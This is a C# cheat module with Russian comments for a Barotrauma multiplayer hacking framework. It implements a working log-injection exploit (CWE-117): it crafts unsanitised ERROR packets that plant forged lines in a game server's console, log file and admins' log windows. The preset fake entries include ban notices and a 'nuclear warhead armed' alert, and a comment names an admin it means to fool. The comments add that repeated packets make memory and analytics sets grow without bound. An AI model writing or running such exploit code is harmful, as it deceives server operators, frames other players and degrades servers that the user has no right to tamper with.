// ============================================================================
//  ErrorForgeModule.cs — «ФОРЖЕР ЛОГОВ» (волна 718)
//  NEW FIND: CWE-117 log injection через ERROR-пакет.
//
//  ПУТЬ (GameServer.cs:1035 → HandleClientError):
//    case ClientPacketHeader.ERROR:
//        ClientNetError error = (ClientNetError)inc.ReadByte();
//        case MISSING_ENTITY (1):
//            u16 eventID, u16 entityID, byte subCount (макс 5),
//            subCount × string  ← СЫРЫЕ КЛИЕНТСКИЕ СТРОКИ (лимит 16 симв.,
//            null/длиннее → malformedData=true → КИК за "malformed error data")
//        ...
//        Log(ClientLogName(c) + " has reported an error: " + errorStr, Error)
//    errorStr при GameStarted && (subCount != Submarine.Loaded.Count) получает
//    хвост "Loaded submarines don't match (client: <НАШ ТЕКСТ>, server: ...)".
//    Санитизации НЕТ (ServerLog.WriteLine — RawString, строки ≤16 сим валидны).
//
//  ЭФФЕКТЫ:
//    1. Произвольный текст (порциями по 5×16=80 симв.) в:
//       - консоль сервера (DebugConsole.NewMessage, красный Error)
//       - файл лога сервера (ServerLog.Save по LinesPerFile)
//       - окно лога у ВСЕХ клиентов с пермом ServerLog (админ видит!)
//    2. ServerLog.lines/unsavedLines — НЕОГРАНИЧЕННЫЕ очереди в памяти
//       до записи в файл → спам = память + диск (медленный burn, 66 пак/с кап).
//    3. GameAnalyticsManager.sentEventIdentifiers — HashSet с ключом
//       "GameServer.HandleClientError:<errorStrNoName>" — errorStrNoName
//       содержит eventID/entityID из пакета (2^32 вариантов) → unbounded
//       рост HashSet при SendUserStatistics=true (каждый уникальный пакет
//       навсегда оставляет ~100B). Медленная утечка за часы.
//
//  НИКТО НЕ ПОСТРАДАЛ: парсинг <1мс (0 страйков), валидный пакет (0 киков).
//  Чистый CWE-117: подделка записей серверного лога без пермов.
//  Прикол для Hedrex: его консоль увидит "BAN: <ник> (читы)" хотя ничего
//  не происходило. Приставка "Client X has reported an error:" не убирается —
//  но админы читают хвост строки чаще.
// ============================================================================

using System;
using System.Text;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    public class ErrorForgeModule : CSModuleBase
    {
        public override string Id   => "error_forge";
        public override string Name => "Error Forge";
        public override string Description =>
            "ERROR packets write RAW client strings into the server log/console with NO sanitization " +
            "(CWE-117 log injection). 5x16 chars of arbitrary text per packet, no perms, no kicks, " +
            "no strikes. Unbounded ServerLog queues + GameAnalytics HashSet growth on top.";
        public override string Category => "exploit";

        public override string GetLabel() => "Error Forge 📜";

        public override void OnClick()
        {
            var box = new GUIMessageBox(
                "ERROR FORGE (CWE-117)",
                "Server logs raw client strings from ERROR packets:\n" +
                "  \"...has reported an error: ... Loaded submarines\n" +
                "   don't match (client: YOUR TEXT, server: ...)\"\n" +
                "\n" +
                "Goes to: server console (red), log FILE, and every client\n" +
                "with ServerLog permission (the admin sees it).\n" +
                "80 chars per packet, no perms, no kicks.\n" +
                "\n" +
                "Pick a fake line to inject:",
                new LocalizedString[]
                {
                    "BAN: SKYLEIOTIC (CHEATS)",
                    "SOLD SUB -15000 MK",
                    "ADMIN MODE: OFF",
                    "nuclear warhead armed",
                    "Close",
                },
                new Vector2(0.62f, 0.65f));

            box.Buttons[0].Color = Color.OrangeRed;
            box.Buttons[1].Color = Color.MediumPurple;
            box.Buttons[2].Color = Color.Orange;
            box.Buttons[3].Color = Color.CornflowerBlue;
            box.Buttons[4].Color = Color.DarkGray;

            box.Buttons[0].OnClicked = (_, _) => { Forge("BAN: SKYLEIOTIC (CHEATS)", 3); return true; };
            box.Buttons[1].OnClicked = (_, _) => { Forge("SOLD SUBMARINE FOR -15000 MK!!", 3); return true; };
            box.Buttons[2].OnClicked = (_, _) => { Forge("ADMIN MODE: OFF (all perms dropped)", 3); return true; };
            box.Buttons[3].OnClicked = (_, _) => { Forge("NUCLEAR WARHEAD ARMED IN 10 SEC", 5); return true; };
            box.Buttons[4].OnClicked = (_, _) => { box.Close(); return true; };
        }

        private static void Forge(string line, int repeats)
        {
            if (GameMain.Client?.ClientPeer == null)
            {
                GUI.AddMessage("[ErrorForge] нет подключения", Color.Red);
                return;
            }

            // нормализуем до 80 символов (5 × 16)
            string padded = line.Length > 80 ? line.Substring(0, 80) : line.PadRight(80);
            var chunks = new string[5];
            for (int i = 0; i < 5; i++)
            {
                chunks[i] = padded.Substring(i * 16, 16).TrimEnd();
                if (chunks[i].Length == 0) { chunks[i] = " "; }
            }

            int sent = 0;
            ushort evId = (ushort)new Random().Next(0, 65535);
            for (int r = 0; r < repeats; r++)
            {
                try
                {
                    var msg = new WriteOnlyMessage();
                    msg.WriteByte((byte)ClientPacketHeader.ERROR);
                    msg.WriteByte((byte)ClientNetError.MISSING_ENTITY);
                    msg.WriteUInt16((ushort)(evId + r)); // уникальный eventID → +утечка в GameAnalytics
                    msg.WriteUInt16(0);                  // entityID=0 (null entity — ок)
                    msg.WriteByte(5);
                    for (int i = 0; i < 5; i++) { msg.WriteString(chunks[i]); }
                    GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                    sent++;
                }
                catch (Exception e)
                {
                    GUI.AddMessage("[ErrorForge] fail: " + e.Message, Color.Red);
                    break;
                }
            }
            GUI.AddMessage($"[ErrorForge] {sent}× подделка в лог сервера: \"{line}\". " +
                "Смотри консоль сервера (красные строки Error).", Color.OrangeRed);
        }
    }
}
